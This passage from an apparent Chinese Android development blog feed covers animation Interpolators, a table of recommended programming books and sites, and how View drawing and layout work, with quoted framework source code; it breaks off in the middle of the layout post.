<p>系统为我们提供了一系列预置的<code>Interpolators</code>，以较常用的<code>LinearInterpolater</code>为例，顾名思义，它是一个线性的插补细分器，意味着输入与输出呈线性关系：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">getInterpolation</span><span class="params">(<span class="keyword">float</span> input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输入输出的关键函数就是这个<code>getInterpolation()</code>了，可以看到，参数与返回值都是<code>float</code>类型，<code>input</code>的值在0-1之间，结合前面，我们可以很容易理解，这个<code>input</code>就是一个以0-1之间的小数表示的过去的时间值，例如整个动画是1000ms，当<code>input</code>为0.25的时候意味着现在的时间过去了250ms。</p>
<p>而返回值就是经过我们的转换，表示出的动画应该进行的时间的比例，这里由于是线性的，所以可以直接返回<code>input</code>，这个值最后会到哪里呢？自然就是给我们前面介绍的<code>TypeEvaluator</code>。下面一段源码展示了这个过程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (mInterpolator != <span class="keyword">null</span>) &#123;</span><br><span class="line">    fraction = mInterpolator.getInterpolation(fraction);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> mEvaluator.evaluate(fraction, mFirstKeyframe.getValue(),</span><br><span class="line">        mLastKeyframe.getValue());</span><br></pre></td></tr></table></figure>
<p>作为<code>getInterpolation()</code>参数的<code>fraction</code>代表着过去的时间比例，这里调用我们设置的<code>Interpolator</code>来更新这个<code>fraction</code>，现在这个<code>fraction</code>表示的就是动画已经进行的比例，下一步就要根据它来获取对应的对象值（调用了我们之间谈到过的<code>evaluate()</code>方法，这里的<code>KeyFrame</code>的概念会在之后的博客讲到），后面的两个参数就是传递给<code>evaluate</code>的起始与结束范围。</p>
<p>最终，我们就获得了一个按照我们设定的<code>Interpolator</code>返回的动画属性值。</p>
<p>如果想要实现加速效果呢？Android同样为我们提供了现成的<code>AccelerateInterpolator</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">getInterpolation</span><span class="params">(<span class="keyword">float</span> input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mFactor == <span class="number">1.0f</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> input * input;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">float</span>)Math.pow(input, mDoubleFactor);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样很简洁，这里用到了<code>mFactor</code>与<code>mDoubleFactor</code>分别表示我们在构造函数里面设置的指数值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AccelerateInterpolator</span><span class="params">(<span class="keyword">float</span> factor)</span> </span>&#123;</span><br><span class="line">    mFactor = factor;</span><br><span class="line">    mDoubleFactor = <span class="number">2</span> * mFactor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们设置的为1，会返回<code>input</code>的平方，其他值则会返回<code>input</code>的<code>mDoubleFactor</code>次方，使得动画属性可以以不同的函数曲线形式变化。</p>
<p>如果我们要实现自己的<code>Interpolator</code>呢？只需要实现<code>TimeInterpolator</code>接口，这个接口只需要我们实现一个<code>getInterpolation</code>方法。我们可以根据<code>input</code>值返回不同的值来返回不同的值表示动画的进度。</p>
<p><strong>注意：</strong>返回值的范围不一定要在0-1之间，小于0或大小1的值可以表示超出预设范围的目标值。</p>
<p>这篇博客到此结束，在下一篇博客中将会以一个绘制自由落体的弹跳小球的示例来演示如何使用<code>Animator</code>与介绍它的回调函数。</p>
]]></content>
      <categories>
        <category>Android</category>
        <category>UI</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>UI</tag>
        <tag>Animation</tag>
      </tags>
  </entry>
  <entry>
    <title>学习资源收集</title>
    <url>/2017/03/25/resource_general/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<table>
<thead>
<tr>
<th>技术分类</th>
<th>资源类型</th>
<th>标题</th>
<th>链接</th>
<th>简介</th>
</tr>
</thead>
<tbody>
<tr>
<td>C语言</td>
<td>书籍</td>
<td>C Primer Plus</td>
<td><a href="https://item.jd.com/11917487.html" target="_blank" rel="noopener">链接</a></td>
<td>C语言推荐入门书籍</td>
</tr>
<tr>
<td>算法</td>
<td>网站</td>
<td>编程练习/算法练习/面试刷题</td>
<td><a href="https://leetcode.com/" target="_blank" rel="noopener">链接</a></td>
<td>在线编程及测试网站，体验良好，题目优秀，从易到难做</td>
</tr>
<tr>
<td>数据结构与算法分析</td>
<td>书籍</td>
<td>数据结构与算法分析：C语言描述 第2版</td>
<td><a href="https://item.jd.com/10057441.html" target="_blank" rel="noopener">链接</a></td>
<td>数据结构与算法分析权威书籍</td>
</tr>
<tr>
<td>算法</td>
<td>书籍</td>
<td>算法 第4版</td>
<td><a href="https://item.jd.com/11098789.html" target="_blank" rel="noopener">链接</a></td>
<td>算法学习推荐书籍，强烈建议配合网课(<a href="https://www.coursera.org/learn/algorithms-part1#" target="_blank" rel="noopener">链接</a>)进行学习</td>
</tr>
<tr>
<td>Java</td>
<td>书籍</td>
<td>Java核心技术 卷1：基础知识（原书第10版）</td>
<td><a href="https://item.jd.com/12037418.html" target="_blank" rel="noopener">链接</a></td>
<td>Java语言推荐入门书籍</td>
</tr>
<tr>
<td>Java</td>
<td>书籍</td>
<td>Effective Java中文版（第2版）</td>
<td><a href="https://item.jd.com/10058902.html" target="_blank" rel="noopener">链接</a></td>
<td>Java语言推荐进阶书籍</td>
</tr>
<tr>
<td>Java</td>
<td>书籍</td>
<td>Java核心技术 卷2：高级特性（原书第9版）</td>
<td><a href="https://item.jd.com/11409707.html" target="_blank" rel="noopener">链接</a></td>
<td>Java语言推荐进阶书籍</td>
</tr>
<tr>
<td>生活</td>
<td>网站</td>
<td>V2EX</td>
<td><a href="https://www.v2ex.com/" target="_blank" rel="noopener">链接</a></td>
<td>程序员生活</td>
</tr>
<tr>
<td>计算机网络</td>
<td>书籍</td>
<td>计算机网络（第5版）</td>
<td><a href="https://item.jd.com/10927233.html" target="_blank" rel="noopener">链接</a></td>
<td>计算机网络基础推荐书籍</td>
</tr>
<tr>
<td>操作系统</td>
<td>书籍</td>
<td>现代操作系统（原书第3版）</td>
<td><a href="https://item.jd.com/10058893.html" target="_blank" rel="noopener">链接</a></td>
<td>操作系统推荐书籍</td>
</tr>
<tr>
<td>计算机网络</td>
<td>书籍</td>
<td>TCP/IP详解：卷1+卷2+卷3</td>
<td><a href="https://item.jd.com/11311644.html" target="_blank" rel="noopener">链接</a></td>
<td>计算机网络进阶推荐书籍</td>
</tr>
<tr>
<td>Linux</td>
<td>公开课</td>
<td>Linux 入门基础</td>
<td><a href="http://study.163.com/course/introduction.htm?courseId=232007" target="_blank" rel="noopener">链接</a></td>
<td>Linux 入门基础</td>
</tr>
<tr>
<td>Android</td>
<td>博客</td>
<td>Android学习路线指南</td>
<td><a href="http://blog.csdn.net/singwhatiwanna/article/details/49560409" target="_blank" rel="noopener">链接</a></td>
<td>Android开发艺术探索一书的作者分享的安卓学习路线，供参考</td>
</tr>
<tr>
<td>Android</td>
<td>书籍</td>
<td>第一行代码 Android 第2版</td>
<td><a href="https://item.jd.com/12012505.html" target="_blank" rel="noopener">链接</a></td>
<td>Android入门推荐书籍</td>
</tr>
<tr>
<td>Android</td>
<td>书籍</td>
<td>安卓Android开发艺术探索+Android群英传+源码设计模式解析</td>
<td><a href="https://item.jd.com/10006052205.html" target="_blank" rel="noopener">链接</a></td>
<td>Android进阶必读</td>
</tr>
<tr>
<td>计算机系统</td>
<td>书籍</td>
<td>深入理解计算机系统（原书第3版）</td>
<td><a href="https://item.jd.com/12006637.html" target="_blank" rel="noopener">链接</a></td>
<td>理解计算机系统</td>
</tr>
<tr>
<td>汇编语言</td>
<td>书籍</td>
<td>汇编语言（第3版）</td>
<td><a href="https://item.jd.com/11314390.html" target="_blank" rel="noopener">链接</a></td>
<td>汇编语言推荐书籍</td>
</tr>
<tr>
<td>汇编语言</td>
<td>博客</td>
<td>上面这本书的检测点与实验解析</td>
<td><a href="http://blog.duskdragon.com/all-categories/#posts-list-汇编" target="_blank" rel="noopener">链接</a></td>
<td>上面这本书的检测点与实验解析By2015级陈志浩</td>
</tr>
<tr>
<td>规范</td>
<td>书籍</td>
<td>重构 改善既有代码的设计</td>
<td><a href="https://item.jd.com/11728740.html" target="_blank" rel="noopener">链接</a></td>
<td>改善代码质量的进阶书籍</td>
</tr>
<tr>
<td>Java</td>
<td>书籍</td>
<td>深入理解Java虚拟机：JVM高级特性与最佳实践（第2版）</td>
<td><a href="https://item.jd.com/11252778.html" target="_blank" rel="noopener">链接</a></td>
<td>Java深入必读</td>
</tr>
<tr>
<td>Java</td>
<td>书籍</td>
<td>华章专业开发者丛书·Java并发编程实战</td>
<td><a href="https://item.jd.com/10922250.html" target="_blank" rel="noopener">链接</a></td>
<td>Java并发编程推荐书籍</td>
</tr>
<tr>
<td>设计模式</td>
<td>书籍</td>
<td>O’Reilly：Head First设计模式（中文版）</td>
<td><a href="https://item.jd.com/10100236.html" target="_blank" rel="noopener">链接</a></td>
<td>设计模式推荐书籍</td>
</tr>
<tr>
<td>iOS</td>
<td>书籍</td>
<td>Objective-C程序设计（第6版）</td>
<td><a href="https://item.jd.com/11508561.html" target="_blank" rel="noopener">链接</a></td>
<td>Objective-C语言入门书籍</td>
</tr>
<tr>
<td>iOS</td>
<td>书籍</td>
<td>Objective-C基础教程(第2版)</td>
<td><a href="https://item.jd.com/11232703.html" target="_blank" rel="noopener">链接</a></td>
<td>Objective-C语言入门书籍’</td>
</tr>
<tr>
<td>iOS</td>
<td>书籍</td>
<td>Effective Objective-C 2.0：编写高质量iOS与OS X代码的52个有效方法</td>
<td><a href="https://item.jd.com/11402853.html" target="_blank" rel="noopener">链接</a></td>
<td>Objective-C与iOS开发提高</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>Resource</category>
      </categories>
      <tags>
        <tag>Resource</tag>
      </tags>
  </entry>
  <entry>
    <title>Android View绘制（四）onDraw过程与Canvas Bitmap</title>
    <url>/2017/03/12/android_view_onDraw_canvas/</url>
    <content><![CDATA[<h2 id="draw-方法"><a href="#draw-方法" class="headerlink" title="draw()方法"></a>draw()方法</h2><p>经过对<code>View</code>的<a href="http://www.viseator.xyz/2017/03/10/android_view_onMeasure/" target="_blank" rel="noopener">测量</a>与<a href="http://www.viseator.xyz/2017/03/12/android_view_onLayout/" target="_blank" rel="noopener">布局</a>过程后，下面就到了真正的<code>View</code>绘制的过程了。这个过程从调用根<code>View</code>的<code>draw()</code>方法开始：（省略部分代码）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">(Canvas canvas)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> privateFlags = mPrivateFlags;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">boolean</span> dirtyOpaque = (privateFlags &amp; PFLAG_DIRTY_MASK) == PFLAG_DIRTY_OPAQUE &amp;&amp;</span><br><span class="line">            (mAttachInfo == <span class="keyword">null</span> || !mAttachInfo.mIgnoreDirtyState);</span><br><span class="line">    mPrivateFlags = (privateFlags &amp; ~PFLAG_DIRTY_MASK) | PFLAG_DRAWN;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Draw traversal performs several drawing steps which must be executed</span></span><br><span class="line"><span class="comment">     * in the appropriate order:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *      1. Draw the background</span></span><br><span class="line"><span class="comment">     *      2. If necessary, save the canvas' layers to prepare for fading</span></span><br><span class="line"><span class="comment">     *      3. Draw view's content</span></span><br><span class="line"><span class="comment">     *      4. Draw children</span></span><br><span class="line"><span class="comment">     *      5. If necessary, draw the fading edges and restore layers</span></span><br><span class="line"><span class="comment">     *      6. Draw decorations (scrollbars for instance)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 1, draw the background, if needed</span></span><br><span class="line">    <span class="keyword">int</span> saveCount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dirtyOpaque) &#123;</span><br><span class="line">        drawBackground(canvas);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// skip step 2 &amp; 5 if possible (common case)</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> viewFlags = mViewFlags;</span><br><span class="line">    <span class="keyword">boolean</span> horizontalEdges = (viewFlags &amp; FADING_EDGE_HORIZONTAL) != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">boolean</span> verticalEdges = (viewFlags &amp; FADING_EDGE_VERTICAL) != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!verticalEdges &amp;&amp; !horizontalEdges) &#123;</span><br><span class="line">        <span class="comment">// Step 3, draw the content</span></span><br><span class="line">        <span class="keyword">if</span> (!dirtyOpaque) onDraw(canvas);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 4, draw the children</span></span><br><span class="line">        dispatchDraw(canvas);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Overlay is part of the content and draws beneath Foreground</span></span><br><span class="line">        <span class="keyword">if</span> (mOverlay != <span class="keyword">null</span> &amp;&amp; !mOverlay.isEmpty()) &#123;</span><br><span class="line">            mOverlay.getOverlayView().dispatchDraw(canvas);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 6, draw decorations (foreground, scrollbars)</span></span><br><span class="line">        onDrawForeground(canvas);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// we're done...</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这段源码来自于<code>View</code>，过程非常清晰，执行了以下的步骤（如果需要）：</p>
<ol>
<li>27-30行进行判断是否跳过注释中的第2、5步，通常情况跳过</li>
<li>22-24行，进行背景的绘制</li>
<li>32行，调用<code>onDraw()</code>方法进行自身的绘制</li>
<li>35行，调用<code>dispatchDraw()</code>方法，进行子<code>View</code>的绘制（调用子<code>View</code>的<code>draw()</code>方法），同时也表明了子<code>View</code>的绘制在自身之后这一顺序</li>
<li>43行，进行前景的绘制，一般为装饰组件，如滚动条等</li>
</ol>
<a id="more"></a>
<h2 id="dispatchDraw-方法"><a href="#dispatchDraw-方法" class="headerlink" title="dispatchDraw()方法"></a>dispatchDraw()方法</h2><p><code>onDraw()</code>方法先不谈，看看<code>dispatchDraw()</code>方法做了什么，以<code>ViewGroup</code>为例：(省略部分代码)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">dispatchDraw</span><span class="params">(Canvas canvas)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; childrenCount; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((transientChild.mViewFlags &amp; VISIBILITY_MASK) == VISIBLE ||</span><br><span class="line">        transientChild.getAnimation() != <span class="keyword">null</span>) &#123;</span><br><span class="line">      more |= drawChild(canvas, transientChild, drawingTime);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">drawChild</span><span class="params">(Canvas canvas, View child, <span class="keyword">long</span> drawingTime)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> child.draw(canvas, <span class="keyword">this</span>, drawingTime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单来看，依次调用了子<code>View</code>的<code>draw()</code>方法。所以对于有子<code>View</code>的<code>ViewGroup</code>， 我们需要重写这个方法来决定子<code>View</code>绘制的顺序。</p>
<h2 id="Canvas-Bitmap-Surface间的联系"><a href="#Canvas-Bitmap-Surface间的联系" class="headerlink" title="Canvas Bitmap Surface间的联系"></a>Canvas Bitmap Surface间的联系</h2><p>背景与前景绘制的过程一般不由我们控制，自定义<code>View</code>时关键的内容就在<code>onDraw()</code>方法中。</p>
<p>你可能已经发现，在这些<code>View</code>绘制过程中的函数都具有一个参数<code>Canvas</code>，这个<code>Canvas</code>字面意义上为画布，那它实际上是什么，又在绘制过程中起着什么样的重要作用呢？</p>
<p>我们可以把<code>Canvas</code>看作是系统给予我们的一个虚拟的对象，或者说是我们绘制图形的一个中介，<code>Canvas</code>具有一系列的方法可以供我们调用来直观地绘制图形，我们对于<code>Canvas</code>的所有操作都会被系统处理从而反映在屏幕上而不用我们去手动地决定哪一个像素应该显示什么颜色。</p>
<p>在<code>Canvas</code>背后则是一个<code>Bitmap</code>对象，我们的绘制实际上会反映在这个<code>Bitmap</code>上再交由系统来显示。如果我们需要自己创建一个<code>Canvas</code>，我们必须创建一个<code>Bitmap</code>对象作为<code>Canvas</code>的构造参数。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Bitmap b = Bitmap.createBitmap(<span class="number">100</span>, <span class="number">100</span>, Bitmap.Config.ARGB_8888);</span><br><span class="line">Canvas c = <span class="keyword">new</span> Canvas(b);</span><br></pre></td></tr></table></figure>
<p>这样这个<code>Canvas</code>就会在指定的<code>Bitmap</code>上进行绘制，我们也可以通过<code>Canvas</code>的<code>drawBitmap()</code>方法来在指定的<code>Bitmap</code>上绘制。</p>
<p>那么问题来了，<code>onDraw()</code>方法给我们提供的这个<code>Canvas</code>是从哪里来的，为什么我们对它的操作可以反映到屏幕上？下面这张图便于我们去了解这个过程：</p>
<p><img src="/images/canvas_bitmap.jpg" alt="canvas_bitmap"></p>
<p>可以看到，我们的屏幕被分为了几个<code>Window</code>，每一个<code>Window</code>都有着自己的<code>Surface</code>，<code>Surface</code>具有两级缓存，每个缓存中存放着将要显示在屏幕上的像素数据，而当我们想要刷新屏幕显示新的内容时，对应的<code>Surface</code>将会读取缓存中的数据来进行更新。</p>
<p><code>onDraw()</code>方法中的<code>canvas</code>就是在一个<code>Surface</code>显示完毕，将这个<code>Surface</code>锁定时由它返回的，在这个<code>canvas</code>上进行的操作就可以在下一次刷新屏幕时显示，但是实际上并不是由<code>canvas</code>直接写数据到它的<code>Surface</code>缓存中，这中间还有一个对象就是我们之前提到的<code>Bitmap</code>，<code>Bitmap</code>储存着的正是像素信息，而<code>Surface</code>返回的<code>canvas</code>中含有的就是一个指向<code>Surface</code>缓存的<code>Bitmap</code>。</p>
<p>梳理一下整个过程，我们需要做的是操作这个封装了一系列绘图方法的<code>canvas</code>，<code>canvas</code>将操作反映到内含的<code>Bitmap</code>上，<code>Bitmap</code>将数据反映给<code>Surface</code>的缓存，<code>Surface</code>在下一次刷新时读取缓存中的内容并显示到屏幕上。</p>
<p>这里还应注意的是每个<code>Window</code>有且仅有一个单继承（即只有一个根）的<code>View</code>树，<code>View</code>将会将<code>Surface</code>返回的<code>canvas</code>向下传递来让子<code>View</code>依次完成部分区域的绘制。</p>
<p>弄清楚这个<code>canvas</code>的来源之后，我们就可以放心地在用它来“作画”了。</p>
<h2 id="onDraw-方法"><a href="#onDraw-方法" class="headerlink" title="onDraw()方法"></a>onDraw()方法</h2><p>在<code>onDraw()</code>方法中我们可以对方法参数提供的<code>canvas</code>进行操作，绘制各种自定义的图形。</p>
<p>我们可以选择一个现有的<code>View</code>作为自定义<code>View</code>的父类，在它的<code>onDraw()</code>方法中一定要调用<code>super.onDraw()</code>来令它绘制本来的组件，我们可以在调用<code>super.onDraw()</code>之前或之后插入我们自己的代码，这取决你对绘制顺序的需要。</p>
<p><strong>注意有些<code>View</code>如<code>Linearlayout</code>默认是不绘制自己的，也就是说它们并不会调用<code>onDraw()</code>方法，当我们需要继承这类<code>View</code>来进行自定义并进行绘制的话需要调用<code>setWillNotDraw(false);</code>。可以在<code>onMeasure()</code>方法中调用。</strong></p>
<p>另一种方式是继承于<code>View</code>，可以更为自由地订制各种行为。</p>
<p><code>Canvas</code>中封装了非常多的方法，下面列举一部分：</p>
<ul>
<li><a href="https://developer.android.com/reference/android/graphics/Canvas.html#drawArc(float, float, float, float, float, float, boolean, android.graphics.Paint" target="_blank" rel="noopener">drawArc</a>)(float left, float top, float right, float bottom, float startAngle, float sweepAngle, boolean useCenter, <a href="https://developer.android.com/reference/android/graphics/Paint.html" target="_blank" rel="noopener">Paint</a> paint)：绘制椭圆</li>
<li><a href="https://developer.android.com/reference/android/graphics/Canvas.html#drawCircle(float, float, float, android.graphics.Paint" target="_blank" rel="noopener">drawCircle</a>)(float cx, float cy, float radius, <a href="https://developer.android.com/reference/android/graphics/Paint.html" target="_blank" rel="noopener">Paint</a> paint)：绘制圆形</li>
<li><a href="https://developer.android.com/reference/android/graphics/Canvas.html#drawColor(int" target="_blank" rel="noopener">drawColor</a>)(int color)：对整个<code>Canvas</code>填充颜色</li>
<li><a href="https://developer.android.com/reference/android/graphics/Canvas.html#drawLine(float, float, float, float, android.graphics.Paint" target="_blank" rel="noopener">drawLine</a>)(float startX, float startY, float stopX, float stopY, <a href="https://developer.android.com/reference/android/graphics/Paint.html" target="_blank" rel="noopener">Paint</a> paint)：绘制直线</li>
<li><a href="https://developer.android.com/reference/android/graphics/Canvas.html#drawLines(float[], int, int, android.graphics.Paint" target="_blank" rel="noopener">drawLines</a>)(float[] pts, int offset, int count, <a href="https://developer.android.com/reference/android/graphics/Paint.html" target="_blank" rel="noopener">Paint</a> paint)：绘制一系列直线</li>
<li><a href="https://developer.android.com/reference/android/graphics/Canvas.html#drawPicture(android.graphics.Picture, android.graphics.Rect" target="_blank" rel="noopener">drawPicture</a>)(<a href="https://developer.android.com/reference/android/graphics/Picture.html" target="_blank" rel="noopener">Picture</a> picture, <a href="https://developer.android.com/reference/android/graphics/Rect.html" target="_blank" rel="noopener">Rect</a> dst)：绘制一张图片</li>
<li><a href="https://developer.android.com/reference/android/graphics/Canvas.html#drawPoint(float, float, android.graphics.Paint" target="_blank" rel="noopener">drawPoint</a>)(float x, float y, <a href="https://developer.android.com/reference/android/graphics/Paint.html" target="_blank" rel="noopener">Paint</a> paint)：绘制一个点</li>
<li><a href="https://developer.android.com/reference/android/graphics/Canvas.html#drawPoints(float[], int, int, android.graphics.Paint" target="_blank" rel="noopener">drawPoints</a>)(float[] pts, int offset, int count, <a href="https://developer.android.com/reference/android/graphics/Paint.html" target="_blank" rel="noopener">Paint</a> paint)：绘制一系列点</li>
<li><a href="https://developer.android.com/reference/android/graphics/Canvas.html#drawRect(float, float, float, float, android.graphics.Paint" target="_blank" rel="noopener">drawRect</a>)(float left, float top, float right, float bottom, <a href="https://developer.android.com/reference/android/graphics/Paint.html" target="_blank" rel="noopener">Paint</a> paint)：绘制矩形</li>
<li><a href="https://developer.android.com/reference/android/graphics/Canvas.html#drawRoundRect(android.graphics.RectF, float, float, android.graphics.Paint" target="_blank" rel="noopener">drawRoundRect</a>)(<a href="https://developer.android.com/reference/android/graphics/RectF.html" target="_blank" rel="noopener">RectF</a> rect, float rx, float ry, <a href="https://developer.android.com/reference/android/graphics/Paint.html" target="_blank" rel="noopener">Paint</a> paint)：绘制圆角矩形</li>
<li><a href="https://developer.android.com/reference/android/graphics/Canvas.html#drawText(java.lang.CharSequence, int, int, float, float, android.graphics.Paint" target="_blank" rel="noopener">drawText</a>)(<a href="https://developer.android.com/reference/java/lang/CharSequence.html" target="_blank" rel="noopener">CharSequence</a> text, int start, int end, float x, float y, <a href="https://developer.android.com/reference/android/graphics/Paint.html" target="_blank" rel="noopener">Paint</a> paint)：绘制文字</li>
<li><a href="https://developer.android.com/reference/android/graphics/Canvas.html#drawTextOnPath(java.lang.String, android.graphics.Path, float, float, android.graphics.Paint" target="_blank" rel="noopener">drawTextOnPath</a>)(<a href="https://developer.android.com/reference/java/lang/String.html" target="_blank" rel="noopener">String</a> text, <a href="https://developer.android.com/reference/android/graphics/Path.html" target="_blank" rel="noopener">Path</a> path, float hOffset, float vOffset, <a href="https://developer.android.com/reference/android/graphics/Paint.html" target="_blank" rel="noopener">Paint</a> paint)：沿路径绘制文字</li>
</ul>
<p>方法的详细信息在<a href="https://developer.android.com/reference/android/graphics/Canvas.html" target="_blank" rel="noopener">官方文档</a>中。</p>
<p>我们注意到，许多绘制方法都需要一个<code>Paint</code>参数， 这个<code>Paint</code>可以理解为系统为我们抽象出的一支画笔，我们所绘制的图形都是用这支画笔绘制出来的，当然因此我们就可以对画笔设置颜色、粗细等属性，我们甚至可以用<code>setShader()</code>方法为这个<code>Paint</code>设置一个<code>Shader</code>，来实现各种特殊的动态效果，<code>Shader</code>的使用需要另起一篇博客来讲。</p>
]]></content>
      <categories>
        <category>Android</category>
        <category>View</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>View</tag>
      </tags>
  </entry>
  <entry>
    <title>Android View绘制（三）layout过程</title>
    <url>/2017/03/12/android_view_onLayout/</url>
    <content><![CDATA[<p>经过<a href="http://www.viseator.xyz/2017/03/10/android_view_onMeasure/" target="_blank" rel="noopener">上一篇</a>介绍的<code>measure</code>过程之后，各个<code>View</code>的尺寸信息已经存储在了每个<code>View</code>中，下面是<code>layout</code>过程，<code>layout</code>过程的目的是根据上一步中计算出的尺寸来正确设置各个<code>View</code>及其后代的位置。这个过程首先被调用的是<code>View</code>的<code>layout()</code>方法，<code>layout()</code>的方法签名是<code>public void layout(int l, int t, int r, int b)</code>，四个参数分别为左边界距父<code>View</code>左边界的距离，上边界距父<code>View</code>上边界的距离，右边界距父<code>View</code>左边界的距离，下边界距父<code>View</code>上边界的距离。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">boolean</span> changed = isLayoutModeOptical(mParent) ?</span><br><span class="line">        setOpticalFrame(l, t, r, b) : setFrame(l, t, r, b);</span><br></pre></td></tr></table></figure>
<p><code>changed</code>是用于传递给<code>onLayout()</code>方法的参数，它指示了布局是否被改变。</p>
<p>后面的表达式查看了父<code>View</code>的布局模式是否需要显示边框，如需要，调用的是<code>setOpticalFrame()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">setOpticalFrame</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> top, <span class="keyword">int</span> right, <span class="keyword">int</span> bottom)</span> </span>&#123;</span><br><span class="line">    Insets parentInsets = mParent <span class="keyword">instanceof</span> View ?</span><br><span class="line">            ((View) mParent).getOpticalInsets() : Insets.NONE;</span><br><span class="line">    Insets childInsets = getOpticalInsets();</span><br><span class="line">    <span class="keyword">return</span> setFrame(</span><br><span class="line">            left   + parentInsets.left - childInsets.left,</span><br><span class="line">            top    + parentInsets.top  - childInsets.top,</span><br><span class="line">            right  + parentInsets.left + childInsets.right,</span><br><span class="line">            bottom + parentInsets.top  + childInsets.bottom);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 可以看到这个方法读取了设置的边框值， 把原值加上边框值后还是调用了<code>setFrame()</code>方法。</p>
<p><code>setFrame()</code>方法通过传入的参数确定了该<code>View</code>最终的位置以及尺寸。<br><a id="more"></a></p>
<p>可以看到，一个<code>View</code>最终显示在什么位置以及它的尺寸是由<code>layout()</code>方法决定的，<code>onMeasure()</code>方法只是将测量出的<code>View</code>期望具有的大小储存在<code>View</code>中。一般情况下，我们会根据储存的这个尺寸来作为设定的依据。</p>
<p>接下来<code>layout()</code>方法会调用<code>onLayout()</code>方法，（如果需要的话）我们需要重写这个方法来调用子<code>View</code>的<code>layout()</code>方法。所以决定子<code>View</code>如何显示的关键步骤就在这里，他们的位置和尺寸完全取决于这里调用它们的<code>layout()</code>方法时传入的参数。当然一般情况下我们会根据子<code>View</code>中的测量结果来设置这个值。这里拿<code>FrameLayout</code>这个需要处理子<code>View</code>的<code>ViewGroup</code>实例来举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onLayout</span><span class="params">(<span class="keyword">boolean</span> changed, <span class="keyword">int</span> left, <span class="keyword">int</span> top, <span class="keyword">int</span> right, <span class="keyword">int</span> bottom)</span> </span>&#123;</span><br><span class="line">    layoutChildren(left, top, right, bottom, <span class="keyword">false</span> <span class="comment">/* no force left gravity */</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接调用了<code>layoutChildren()</code>：（省略部分行）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">layoutChildren</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> top, <span class="keyword">int</span> right, <span class="keyword">int</span> bottom, <span class="keyword">boolean</span> forceLeftGravity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> count = getChildCount();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> parentLeft = getPaddingLeftWithForeground();</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> parentRight = right - left - getPaddingRightWithForeground();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> parentTop = getPaddingTopWithForeground();</span><br><span 